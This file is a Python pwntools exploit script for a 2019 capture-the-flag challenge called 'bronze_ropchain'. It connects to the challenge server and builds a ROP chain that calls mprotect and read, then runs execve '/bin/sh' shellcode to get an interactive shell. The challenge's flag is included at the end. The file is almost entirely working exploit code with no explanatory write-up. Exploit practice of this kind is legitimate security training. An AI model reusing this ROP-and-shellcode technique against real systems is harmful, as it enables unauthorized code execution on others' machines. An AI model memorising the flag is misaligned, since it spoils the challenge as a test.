from pwn import *


binpath = './bronze_ropchain'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']

elf = ELF(binpath)
libc = elf.libc


gdbscript = '''
gef
# b greet
# b *0x80488c6
# 
# b *0x80481d0
# just before return
b *0x80488e9
# shellcode
b *0x080d8100

set $org=0xffffd000
set $rop=0xffffcfd0
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = process(binpath)
# nc chall.2019.redpwn.net 4004
io = remote('chall.2019.redpwn.net', 4004)


ret = 0x80481b2
popret = 0x80481c9
pop2ret = 0x804834b
pop3ret = 0x804834a
pop4ret = 0x8048349
addr_data = 0x080d8000
addr_shellcode = addr_data + 0x100

# This shellcode doesn't do shit
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"


payload = ''
payload += p32(ret) * 0x7
payload += p32(pop4ret)
payload += p32(0x0)
payload += p32(0xdeadbeaf)
payload += p32(0xdeadbeaf)
payload += p32(0xdeadbeaf)

# call mprotect to change bss's permission
payload += p32(elf.symbols['mprotect'])
payload += p32(pop3ret)
payload += p32(addr_data)
payload += p32(0x1000)
payload += p32(0x7)

# read shellcode
payload += p32(elf.symbols['read'])
payload += p32(pop3ret)
payload += p32(0)
payload += p32(addr_shellcode)
payload += p32(len(shellcode))

# return to shellcode
payload += p32(addr_shellcode)

assert '\n' not in payload

io.recvuntil('?\n')
io.sendline(payload)

# skip getchar
io.send('\n')

# send shellcode
io.send(shellcode)


io.interactive()


# flag{I've_n3v3r_he4rd_th4t_nam3_b3fore._Are_u_f0reign?}
